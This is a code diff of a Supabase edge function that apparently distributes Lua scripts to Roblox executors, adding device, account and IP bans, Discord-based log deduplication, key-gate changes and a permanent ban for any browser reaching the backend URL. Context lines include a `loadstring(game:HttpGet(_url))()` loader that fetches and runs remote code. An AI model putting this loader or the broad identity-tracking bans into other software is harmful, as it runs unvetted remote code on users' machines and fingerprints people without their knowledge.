-      // Auto-ban this new IP so even VPN hopping gets caught
-      autoBanNewIp(earlyIp, 'banned_roblox_user_new_ip', uid, null);
-      logThreat('banned_roblox_access', earlyIp, uid, null, { slug, action: 'roblox_id_banned', ip_auto_banned: true }, 'high', true);
-      return new Response(QUIET_ACCESS_DENIED_LUA, { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
+    // v17: DEVICE BAN — a blocked HWID is denied no matter which account or IP it uses.
+    // Evasion attempt itself is evidence: permanently ban every linked identifier.
+    if (isHwidBanned(hwid)) {
+      banIdentity({ ip: earlyIp, robloxId: uid, hwid }, 'banned_device_evasion', {
+        source: 'device_gate', slug, hwid: (hwid || '').substring(0, 64),
+      }).catch(() => {});
+      logThreat('banned_device_access', earlyIp, uid || null, null, {
+        slug, hwid: (hwid || '').substring(0, 32), action: 'hwid_banned', ip_auto_banned: true,
+      }, 'high', true);
+      return new Response(generateKickPlain('Permanently banned from ULT LUA - this device, account and network are blocked'), { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
     }
+
+    // v17: banned Roblox account — ban the IP and device it came back on
+    if (uid && isRobloxIdBanned(uid)) {
+      banIdentity({ ip: earlyIp, robloxId: uid, hwid }, 'banned_account_evasion', {
+        source: 'account_gate', slug, hwid: hwid ? hwid.substring(0, 64) : null,
+      }).catch(() => {});
+      logThreat('banned_roblox_access', earlyIp, uid, null, { slug, action: 'roblox_id_banned', ip_auto_banned: true }, 'high', true);
+      return new Response(generateKickPlain('Permanently banned from ULT LUA - this device, account and network are blocked'), { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
+    }
+
 
     const clientIp = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 
                      req.headers.get('cf-connecting-ip') || 
@@ -4063,12 +4039,19 @@ Deno.serve(async (req) => {
         if (robloxUserId && enrichWithProfile) {
           robloxProfile = await fetchRobloxProfile(robloxUserId);
         }
-        let q = supabase.from('paste_access_logs').select('id').eq('paste_id', paste.id).eq('ip_address', clientIp).eq('access_type', accessType);
+        // Dedupe: when the visitor is Discord-identified, key the row on the Discord
+        // account instead of the IP. Discord's OAuth round trip can surface several
+        // edge IPs for one human, which previously produced 2-3 rows per visit.
+        let q = supabase.from('paste_access_logs').select('id').eq('paste_id', paste.id).eq('access_type', accessType);
+        q = discordData.discord_user_id
+          ? q.eq('discord_user_id', discordData.discord_user_id)
+          : q.eq('ip_address', clientIp);
         q = robloxUserId ? q.eq('roblox_user_id', robloxUserId) : q.is('roblox_user_id', null);
-        const { data: existingLog } = await q.maybeSingle();
+        const { data: existingLogs } = await q.order('last_seen_at', { ascending: false }).limit(1);
+        const existingLog = existingLogs?.[0] ?? null;
         const nowIso = new Date().toISOString();
         const updateData: Record<string, unknown> = {
-          last_seen_at: nowIso, is_active: true, user_agent: userAgent, ...discordData,
+          last_seen_at: nowIso, is_active: true, user_agent: userAgent, ip_address: clientIp, ...discordData,
         };
         if (robloxProfile) {
           updateData.roblox_username = robloxProfile.username;
@@ -4214,7 +4197,9 @@ Deno.serve(async (req) => {
       
       // For protected pastes, generate a bypass token and redirect
       // This keeps key system completely separate from the protection flow
-      if (paste.protection_enabled || paste.public_protection) {
+      // protection_key pastes must ALSO pass the _G.ScriptKey gate, so route them
+      // through the bypass-token redirect instead of serving the payload directly.
+      if (paste.protection_enabled || paste.public_protection || paste.protection_mode === 'protection_key') {
         const bypassToken = generateToken();
         await supabase.from('paste_execution_tokens').insert({
           paste_id: paste.id, roblox_user_id: uid, token: bypassToken,
@@ -4246,6 +4231,42 @@ loadstring(game:HttpGet(_url))()`;
 
     const initialDiscordRedirect = getDiscordRedirectResponse();
     if (initialDiscordRedirect) return initialDiscordRedirect;
+
+    // ===== v19: AUTHORIZED ENTRY POINT ENFORCEMENT (browsers only) =====
+    // The ONLY authorized places a human may reach are the website pages and the
+    // branded /s/<slug> loader page (served by the SPA, never by this function).
+    // Any browser that reaches this backend function URL — no matter the host,
+    // no matter the query — found it by digging. That is an unauthorized access
+    // and earns a permanent, device-wide ban.
+    // Executors are unaffected: they are never flagged as browsers.
+    if (isLikelyBrowser && !isRobloxRequest) {
+      const forwardedHost = (req.headers.get('x-forwarded-host') || url.host || '').toLowerCase();
+
+      let discordId: string | null = null;
+      try {
+        const { data: ds } = await supabase
+          .from('discord_oauth_sessions')
+          .select('discord_user_id')
+          .eq('ip_address', clientIp)
+          .gt('expires_at', new Date().toISOString())
+          .maybeSingle();
+        discordId = ds?.discord_user_id ?? null;
+      } catch { /* fail open on lookup only */ }
+
+      await logAccess(null, 'unauthorized_supabase').catch(() => {});
+      banIdentity({ ip: clientIp, discordId, robloxId: null, hwid: null }, 'unauthorized_backend_access', {
+        source: 'raw_backend_browser_visit', slug, host: forwardedHost,
+        path: url.pathname, query: url.search.substring(0, 200),
+        user_agent: userAgent.substring(0, 200),
+      }).catch(() => {});
+
+      return new Response(generatePermanentBanPage(), {
+        status: 403,
+        headers: { ...corsHeaders, 'Content-Type': 'text/html; charset=utf-8' },
+      });
+    }
+
+
 
     if (shouldShowProtectedBrowserPlaceholder) {
       if (paste.ip_tracking_enabled) {
@@ -4289,6 +4310,22 @@ loadstring(game:HttpGet(_url))()`;
       }
     }
 
+    // ===== KEY SYSTEM GUI (highest priority) =====
+    // If this paste has a key-system panel and there is no execution context yet,
+    // always show the in-game key GUI — regardless of protection mode or
+    // protection_enabled. Previously this only ran for non-protected pastes, so
+    // protected / protection_key pastes never rendered the key UI.
+    if (!isLikelyBrowser && !tk && !kbt && !keyParam) {
+      const gatePanel = await getPreferredKeyPanel();
+      if (gatePanel) {
+        console.log(`[get-paste] Returning key system GUI (global gate) paste=${paste.id} panel=${gatePanel.name}`);
+        const { data: gatePanelDetails } = await supabase
+          .from('control_panels').select('logo_url').eq('id', gatePanel.id).single();
+        const gateGui = generateKeySystemGui(slugStr, baseUrl, gatePanel.name, '188, 134, 255', gatePanelDetails?.logo_url || undefined);
+        return new Response(gateGui, { status: 200, headers: textHeaders });
+      }
+    }
+
     // ===== PROTECTION KEY MODE =====
     // When pastes.protection_mode = 'protection_key', the user must set _G.ScriptKey before loadstring.
     // The loader reads _G.ScriptKey, sends it as ?pkey=, we validate + bind to first roblox uid (anti-spoof).
@@ -4296,7 +4333,9 @@ loadstring(game:HttpGet(_url))()`;
       const pkey = url.searchParams.get('pkey') || '';
 
       // Phase 1: no pkey yet → return tiny key-grabber loader that reads _G.ScriptKey
-      if (!pkey && !tk && !kbt) {
+      // NOTE: a key-system bypass token (kbt) must NOT skip this gate. Panel key
+      // redemption and _G.ScriptKey are independent layers; both must be satisfied.
+      if (!pkey && !tk) {
         // Hardened key grabber: validates key shape, blocks empty/oversized payloads,
         // strips whitespace, and refuses to send if the executor is missing core funcs.
         const keyGrabber = `local ok, err = pcall(function()
